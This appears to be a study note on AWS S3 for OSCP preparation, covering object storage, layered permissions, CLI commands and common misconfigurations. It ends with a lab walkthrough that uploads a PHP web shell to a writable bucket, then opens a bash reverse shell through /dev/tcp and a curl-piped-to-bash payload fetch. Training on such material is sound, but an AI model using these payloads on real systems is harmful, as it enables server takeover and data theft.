___

# Level 1 — Foundation
### What problem was S3 created to solve?
Before cloud storage, companies stored files using:
```
User
 |
Application Server
 |
File Server / NAS
 |
Hard Drives
```

Problems:
- Storage capacity was limited.
- Hardware had to be purchased and maintained.
- Scaling from GB → TB → PB was expensive.
- Backups and redundancy were complicated.
- Global access was difficult.

Amazon created **S3 (Simple Storage Service)** to solve this:
> Store unlimited amounts of data over the internet without managing physical storage.

**Traditional filesystem:**
```
Folders
 └── Files
     └── Data
```

**S3 object storage:**
```
Bucket
 |
 ├── Object 1
 ├── Object 2
 └── Object 3
```

S3 does not behave like a normal hard drive.
It is **object storage**, not block storage or file storage.

### Basic S3 Mental Model
Think of S3 like a giant internet-accessible warehouse.
```
AWS Account
     |
     |
  Bucket
     |
     |
  Objects
     |
     |
 Files + Metadata + Unique Identifier
```

Example:
```
Bucket:
company-backups

Objects:

company-backups/
 |
 ├── database.sql
 ├── employee.xlsx
 ├── website.zip
 └── secrets.txt
```

Each object contains:
```
Object
 |
 ├── Data
 |
 ├── Metadata
 |
 └── Key (unique name)
```

Example:
```
Key:

images/profile/admin.jpg
```

The "folder" is not real.

S3 only sees:
```
Bucket:
my-company

Key:
images/profile/admin.jpg
```
The slash `/` is just part of the object name.

### Where S3 Fits in the Cloud Stack
S3 is part of the **AWS storage layer**.
```
                AWS Cloud

+--------------------------------+
| Applications                   |
|                                |
| EC2        Lambda       ECS    |
|                                |
+--------------------------------+
              |
              |
+--------------------------------+
| Storage Layer                  |
|                                |
| S3        EBS        EFS       |
|                                |
+--------------------------------+
              |
              |
+--------------------------------+
| Physical AWS Infrastructure    |
+--------------------------------+
```

|Storage|Type|Example use|
|---|---|---|
|S3|Object storage|Images, backups, files|
|EBS|Block storage|EC2 hard drives|
|EFS|File storage|Shared filesystem|

For OSCP:
S3 = **look for exposed data and bad permissions**

___

# Level 2 — Technical Understanding & Internal Architecture
## Core S3 Components
### 1. AWS Account
The ownership boundary.
Example:
```
AWS Account
ID: 123456789012
```

Contains:
- Users
- Roles
- Policies
- S3 Buckets

### 2. Bucket
A bucket is the container for objects.
Example:
```
Bucket:

customer-backup-prod
```

Properties:
- Globally unique name
- Created in a region
- Has permissions
- Stores objects

Important:
Bucket names are public.

Example:
```
https://customer-backup-prod.s3.amazonaws.com
```

Attackers often discover buckets through:
```
company-name-backup
company-name-dev
company-name-assets
```

### 3. Object
The actual data.
Object structure:
```
Object
+----------------+
| Key            |
|                |
| Metadata       |
|                |
| Data           |
+----------------+
```

Example:
```
Bucket:

corp-files

Object:

employees/payroll.xlsx
```

Full path:
```
s3://corp-files/employees/payroll.xlsx
```

### 4. Object Key
The identifier of an object.
Example:
```
Bucket:
backup-server

Key:
2026/database.sql
```

Full object:
```
s3://backup-server/2026/database.sql
```

### 5. Region
The physical AWS location.
Examples:
```
us-east-1
eu-west-1
ap-south-1
```

Bucket:
```
company-data

Region:
eu-west-1
```

## S3 Communication Flow
When an application uploads a file:
```
              User/Application

                    |
                    |
             HTTPS Request
                    |
                    |
              AWS S3 API
                    |
                    |
          Authentication Check
                    |
          +---------+---------+
          |                   |
       Allowed             Denied
          |
          |
   Bucket Permission Check
          |
          |
   Object Stored/Retrieved
```

|   Step | Stage                     | What Happens Under the Hood                                                                                                                                                         | AWS Checks / Uses                                                                    | Example                                                                      |
| -----: | ------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------- |
|  **1** | **Upload Request**        | The application wants to upload a file to an S3 bucket. It sends an HTTP `PUT` request containing the object data.                                                                  | S3 endpoint, bucket name, object key, request headers                                | `PUT https://s3.amazonaws.com/my-bucket/image.jpg`                           |
|  **2** | **Request Reaches S3**    | Amazon S3 receives the request and identifies the target bucket and object key.                                                                                                     | Bucket name, object name/key, request headers                                        | **Bucket:** `my-bucket`<br>**Object:** `image.jpg`                           |
|  **3** | **Authentication**        | AWS determines **who is making the request**. The request must contain valid credentials or be associated with an authorized AWS identity.                                          | Access Keys, IAM Roles, Temporary Credentials                                        | AWS identifies the application as an IAM user or IAM role                    |
|  **4** | **Request Signing**       | For authenticated AWS API requests, the client generally signs the request so AWS can verify that the request was created by the credential holder and was not modified in transit. | AWS Signature / request authentication                                               | Signature is calculated using request details and credentials                |
|  **5** | **Authorization**         | AWS determines whether the authenticated identity is actually allowed to perform the requested operation.                                                                           | IAM Policies, Bucket Policies, and, where applicable, ACLs                           | Does this identity have `s3:PutObject` permission for `my-bucket/image.jpg`? |
|  **6** | **Additional Conditions** | AWS can evaluate additional restrictions before allowing the upload.                                                                                                                | Object prefix, encryption requirements, source restrictions, policy conditions, etc. | Policy may allow uploads only to `uploads/`                                  |
|  **7** | **Object Upload**         | If authentication and authorization succeed, S3 accepts the file data and stores it as an object.                                                                                   | Object data + object key                                                             | `image.jpg` is written to the bucket                                         |
|  **8** | **Metadata & Properties** | S3 stores information associated with the object, including metadata and system-managed properties.                                                                                 | Content type, size, timestamps, user-defined metadata, encryption information, etc.  | `Content-Type: image/jpeg`                                                   |
|  **9** | **Response**              | S3 sends a response back to the application indicating whether the operation succeeded or failed.                                                                                   | HTTP response status and response headers                                            | Successful upload → `200 OK`                                                 |
| **10** | **Object Available**      | The application can subsequently access the object according to the permissions and configuration applied to it.                                                                    | IAM policies, bucket permissions, and object access controls                         | `image.jpg` can be retrieved by an authorized request                        |
## Critical Security Detail
### S3 Permissions Are Layered
Access is not controlled in one place.
Decision flow:
```
Request
  |
  |
IAM Policy?
  |
  |
Bucket Policy?
  |
  |
ACL?
  |
  |
Allowed or Denied
```
A single mistake can expose data.

![[Pasted image 20260927001850.png|1000]]

# Level 3 
## Usage 
### a. Flags
| #   | Flag             | Description                       |
| --- | ---------------- | --------------------------------- |
| 1   | `--profile`      | Select AWS credential profile     |
| 2   | `--region`       | Specify AWS region                |
| 3   | `--endpoint-url` | Use custom S3-compatible endpoint |
| 4   | `--recursive`    | Apply action to all objects       |
| 5   | `--dryrun`       | Test operation without executing  |

### b. Core Commands (80% You'll Actually Use)
| #   | Command       | Example                                | Explanation               |
| --- | ------------- | -------------------------------------- | ------------------------- |
| 1   | List buckets  | `aws s3 ls`                            | Shows accessible buckets  |
| 2   | List objects  | `aws s3 ls s3://bucket-name`           | Shows files inside bucket |
| 3   | Download file | `aws s3 cp s3://bucket/file.txt .`     | Copies object locally     |
| 4   | Upload file   | `aws s3 cp file.txt s3://bucket-name/` | Uploads object            |
| 5   | Remove file   | `aws s3 rm s3://bucket/file.txt`       | Deletes object            |

### c. Intermediate Commands
| #   | Command              | Example                                        | Explanation             |
| --- | -------------------- | ---------------------------------------------- | ----------------------- |
| 1   | Recursive download   | `aws s3 cp s3://backup ./backup --recursive`   | Downloads entire bucket |
| 2   | Show bucket location | `aws s3api get-bucket-location --bucket test`  | Finds region            |
| 3   | Check bucket ACL     | `aws s3api get-bucket-acl --bucket test`       | Shows ACL permissions   |
| 4   | View bucket policy   | `aws s3api get-bucket-policy --bucket test`    | Shows policy JSON       |
| 5   | List versions        | `aws s3api list-object-versions --bucket test` | Shows object history    |

### d. Pro-Level Commands
| #   | Command                 | Example                                                                          | Explanation              |
| --- | ----------------------- | -------------------------------------------------------------------------------- | ------------------------ |
| 1   | Check public access     | `aws s3api get-public-access-block --bucket test`                                | Checks exposure controls |
| 2   | Enumerate objects API   | `aws s3api list-objects-v2 --bucket test`                                        | Detailed object listing  |
| 3   | Inspect object metadata | `aws s3api head-object --bucket test --key file.txt`                             | Shows object information |
| 4   | Test anonymous access   | `aws s3api get-object --bucket test --key file.txt output.txt --no-sign-request` |                          |

___

# Level 4 — Security Understanding
## How attackers abuse S3
The biggest issue:
> Developers accidentally make private storage public.

Common attack paths:
```
Find bucket
     |
     |
Check permissions
     |
     |
Download sensitive files
     |
     |
Find secrets
     |
     |
Use credentials elsewhere
```

## Common S3 Vulnerabilities
| # | Vulnerability | Bad Configuration / Cause | Attacker Can | Potential Impact | Recommended Hardening |
|---:|---|---|---|---|---|
| **1** | **Public Read Bucket** | - `s3:GetObject` allowed to everyone | - Download S3 objects | - Data leakage<br>- Source code exposure<br>- Backup exposure | - Enable **Block Public Access**<br>- Use least privilege<br>- Review bucket policies |
| **2** | **Public Write Bucket** | - `s3:PutObject` allowed to everyone | - Upload arbitrary files | - Malicious uploads<br>- Website defacement<br>- Malware hosting | - Disable public write<br>- Use least privilege<br>- Restrict `s3:PutObject` |
| **3** | **Leaked AWS Credentials** | - Credentials exposed in files, repos, backups, etc. | - Make authenticated AWS API requests | - Data theft<br>- Data modification<br>- Other AWS resource access<br>- Unexpected costs | - Use IAM roles / temporary credentials<br>- Revoke exposed credentials<br>- Apply least privilege<br>- Monitor AWS activity |

## OSCP Mistakes
|     # | OSCP MISTAKES                  | What to Remember                                            | Key Details / Examples                                                                            |
| ----: | ------------------------------ | ----------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| **1** | **Only Checking Web Ports**    | Web services can lead to cloud storage.                     | - HTTP<br>- Cloud storage<br>- `HTTP → Cloud storage`                                             |
| **2** | **Assuming S3 Requires Login** | Public S3 buckets may be accessible without authentication. | - Public buckets<br>- No authentication required<br>- Access depends on bucket/object permissions |
| **3** | **Ignoring Filenames**         | Filenames can reveal interesting or sensitive objects.      | - `backup.zip`<br>- `database.sql`<br>- `.env`<br>- `credentials.json`<br>- `config.php`          |

## Root-Cause Recognition
| Symptom I see/hear                    | Likely root cause       | Command to confirm                                 |
| ------------------------------------- | ----------------------- | -------------------------------------------------- |
| `AccessDenied` from private bucket    | Missing permission      | `aws s3 ls s3://bucket`                            |
| Bucket contents visible without login | Public read enabled     | `aws s3 ls s3://bucket --no-sign-request`          |
| Can upload files anonymously          | Public write permission | `aws s3 cp test.txt s3://bucket --no-sign-request` |
| Found `.env` in bucket                | Backup exposure         | `aws s3 cp`                                        |
| AWS keys found in source code         | Credential leakage      | Test with AWS CLI                                  |

___

# Example of Exploitation
> A poorly configured S3 bucket allows attackers to upload files. The bucket is connected to a website's document root. The attacker uploads a PHP file, and the web server executes it, giving the attacker control of the server.

### 1. First understand the normal website structure
Imagine a normal PHP website.
A web server has a folder called the **web root** (also called document root).

Example:
```js
Web Server

/var/www/html/
|
├── index.php
├── login.php
├── contact.php
└── images/
```

This folder contains files that visitors can access.
When someone visits:
```js
https://example.com/login.php
```

The web server does:
```js
Browser
   |
   |
HTTP Request
   |
   |
Web Server
   |
   |
Find login.php
   |
   |
PHP Engine executes it
   |
   |
HTML response returned
```

The important point:
A `.php` file is not just downloaded.
It is **executed by the server**.

Example:
`hello.php`
```php
<?php
echo "Hello";
?>
```

When visited:
```js
example.com/hello.php
```

The server executes PHP:
```js
PHP Code
   |
   |
Execution
   |
   |
Output:
Hello
```

### 2. Now understand S3
S3 is cloud storage.

Example:
```js
AWS S3

Bucket:
company-website

Objects:

index.php
about.php
images/logo.png
```

Normally, S3 just stores files.
Example:
```js
User
 |
 |
Download
 |
 |
S3
 |
 |
file.jpg
```

S3 itself does not execute PHP.
If you upload:
```js
shell.php
```

to a normal S3 bucket:
```js
S3 Bucket

shell.php
```
nothing happens.
It is just a file.

### The dangerous mistake
The problem happens when the company connects:
```js
S3 Bucket
     |
     |
Website Files
     |
     |
Web Server
```

Meaning:
The S3 bucket is being used as the website's storage location.

Example:
A company website:
```js
https://example.com
```

actually loads files from:
```js
S3 Bucket:

company-web-files
```

The bucket contains:
```js
company-web-files

|
├── index.php
├── products.php
├── upload.php
└── images/
```
The web server treats these files as website files.

### The second mistake: Bucket allows writing
Normally:
```js
Attacker

     X

S3 Bucket
```
The attacker cannot upload.

But a bad permission exists:
```js
Bucket Policy:

Allow Everyone:
    s3:PutObject
```

Meaning:
Anyone can upload files.

Now:
```js
Attacker
    |
    |
Upload file
    |
    |
S3 Bucket
```

## What is a PHP shell?
A PHP shell is a PHP program that allows command execution.

Example concept:
```php
shell.php

Receive command
       |
       |
Execute command
       |
       |
Return output
```

A simple example:
```php
<?php
system($_GET['cmd']);
?>
```

If the attacker visits:
```php
example.com/shell.php?cmd=id
```

The server executes:
```php
id
```

and returns:
```php
uid=33(www-data)
```
Now the attacker can execute commands.

## Complete Attack Chain
|  Step | Stage                           | What Happens                                                                                                                      | Example / Result                                                                                                  |
| ----: | ------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| **1** | **Find the Bucket**             | The attacker discovers an S3 bucket associated with the website.                                                                  | `company-website.s3.amazonaws.com`                                                                                |
| **2** | **Check Permissions**           | The attacker determines whether the available AWS identity can upload objects.                                                    | `s3:PutObject = Allowed`                                                                                          |
| **3** | **Create PHP File**             | A malicious PHP file is prepared for the authorized lab scenario.                                                                 | `shell.php`                                                                                                       |
| **4** | **Upload to S3**                | The file is uploaded to the S3 bucket using the AWS CLI.                                                                          | `aws s3 cp shell.php s3://company-website/`<br><br>**Bucket:**<br>- `index.php`<br>- `about.php`<br>- `shell.php` |
| **5** | **Access Through Website**      | The uploaded file is requested through the website. If the web server executes PHP from that location, the PHP code is processed. | `https://company.com/shell.php`                                                                                   |
| **6** | **PHP Execution**               | The web server retrieves the file and passes it to the PHP engine.                                                                | **Browser → Web Server → S3 → PHP Engine**                                                                        |
| **7** | **Remote Code Execution (RCE)** | If the PHP code can execute operating-system commands, the attacker gains remote command execution on the server.                 | **Attacker → PHP → Web Server → Operating System**                                                                |

## S3 → Webroot → RCE Attack Chain
|   Step | Stage                       | What Happens                                                                                                                           | Command / Example                                                                                                                                  | Result                                                        |
| -----: | --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
|  **1** | **Install AWS CLI**         | Install the AWS CLI so you can interact with the S3-compatible service.                                                                | `sudo apt install awscli`                                                                                                                          | AWS CLI becomes available                                     |
|  **2** | **Configure AWS CLI**       | Configure the CLI with placeholder credentials. In this lab, authentication may not actually be enforced by the S3-compatible service. | `aws configure`                                                                                                                                    | CLI is ready to make AWS API requests                         |
|  **3** | **Enumerate Buckets**       | Query the discovered S3 endpoint and list available buckets.                                                                           | `aws --endpoint=http://s3.thetoppers.htb s3 ls`                                                                                                    | Discovers available S3 buckets                                |
|  **4** | **List Bucket Contents**    | List objects and common prefixes inside the discovered bucket.                                                                         | `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`                                                                                | Finds `index.php`, `.htaccess`, and `images/`                 |
|  **5** | **Identify Webroot**        | The bucket contents resemble a website's webroot.                                                                                      | `index.php`<br>`.htaccess`<br>`images/`                                                                                                            | Suggests the S3 bucket is being used as website storage       |
|  **6** | **Create PHP File**         | Create a PHP file that accepts a `cmd` URL parameter and passes it to `system()`.                                                      | `echo '<?php system($_GET["cmd"]); ?>' > shell.php`                                                                                                | Creates `shell.php`                                           |
|  **7** | **Upload PHP File**         | Upload the PHP file to the S3 bucket.                                                                                                  | `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`                                                                      | `shell.php` is stored in the bucket                           |
|  **8** | **Verify Upload**           | Request the uploaded file through the website.                                                                                         | `http://thetoppers.htb/shell.php`                                                                                                                  | Confirms the file is accessible                               |
|  **9** | **Test Code Execution**     | Supply an OS command through the `cmd` parameter.                                                                                      | `http://thetoppers.htb/shell.php?cmd=id`                                                                                                           | Server returns output from `id`, confirming command execution |
| **10** | **Find Local IP**           | Determine the attacker's VPN/interface IP for the reverse shell callback.                                                              | `ifconfig`                                                                                                                                         | Identify the appropriate `tun0` IP                            |
| **11** | **Create Reverse Shell**    | Create a Bash script that connects from the target back to the attacker's listener.                                                    | `#!/bin/bash`<br>`bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1`                                                                                 | Creates `shell.sh`                                            |
| **12** | **Start Listener**          | Listen for the incoming reverse-shell connection.                                                                                      | `nc -nvlp 1337`                                                                                                                                    | Kali waits for the target connection                          |
| **13** | **Host Payload**            | Start a temporary HTTP server from the directory containing `shell.sh`.                                                                | `python3 -m http.server 8000`                                                                                                                      | Target can download `shell.sh`                                |
| **14** | **Fetch & Execute Payload** | The target uses `curl` to download the Bash script from the attacker's HTTP server and pipes it to Bash.                               | `curl http://<YOUR_IP_ADDRESS>:8000/shell.sh \| bash`<br><br>`http://thetoppers.htb/shell.php?cmd=curl%20http://10.10.14.156:8000/shell.sh%7Cbash` | Target executes the reverse-shell payload                     |
| **15** | **Receive Reverse Shell**   | The target connects back to the listener on port `1337`.                                                                               | `nc -nvlp 1337`                                                                                                                                    | Interactive shell is received                                 |
| **16** | **Retrieve Flag**           | The lab flag is located on the target filesystem.                                                                                      | `/var/www/flag.txt`                                                                                                                                | Flag can be read                                              |

